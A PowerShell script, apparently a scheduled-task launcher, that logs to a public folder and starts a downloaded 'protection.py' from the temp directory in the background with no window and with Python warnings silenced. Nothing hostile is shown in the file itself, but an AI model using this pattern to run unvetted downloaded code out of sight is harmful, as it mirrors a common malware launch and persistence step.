# Define log file
$logFile = "C:\Users\Public\Other\Schedule\run_schedule.log"

# Redirect output and errors to log file
Start-Transcript -Path $logFile -Append

# Write current date into a file
Get-Date | Out-File "C:\Users\Public\Other\Schedule\timestamps.txt" -Append

# Get the path to Python executable
$python_path = (Get-Command python).Definition

# Log the python path to the file for debugging
echo "Python Path: $python_path" | Out-File "C:\Users\Public\Other\Schedule\timespy.txt" -Append

# Test Python version
& "$python_path" --version | Out-File "C:\Users\Public\Other\Schedule\timespy.txt" -Append

# Try executing the Python script
#try {
#    #& "$python_path" "`"C:\Users\Beatriz Adriana G\Other\protection\light\protection.py`""
#	& "$python_path" "C:\Users\Beatriz Adriana G\Other\protection\light\protection.py"
#} catch {
#    $_ | Out-File "C:\Users\Public\Other\Schedule\timespy.txt" -Append
#}


$scriptPath = "$env:TEMP/protection.py"

# Call the downloaded script if exist
if (Test-Path -Path $scriptPath) {
	$scriptPathNoExtension = [System.IO.Path]::GetFileNameWithoutExtension($scriptPath)
	$env:PYTHONWARNINGS="ignore"

    # Start the Python script in the background
    Write-Output "[!] Trying to run script in the background!"
	#Start-Process -NoNewWindow -FilePath "$python_path" -ArgumentList "`"$scriptPath`""
	Start-Process -NoNewWindow -FilePath "$python_path" -ArgumentList "$scriptPath"
    Write-Output "[*] Python script executed in the background!" 

	# Execute the script
	#& "$python_path" "$scriptPath" > $null 2>&1
	#echo "[*] Python Script executed!"
} else {
    Write-Output "[!] The script at $scriptPath does not exist. Cannot execute."
}


# End logging
Stop-Transcript
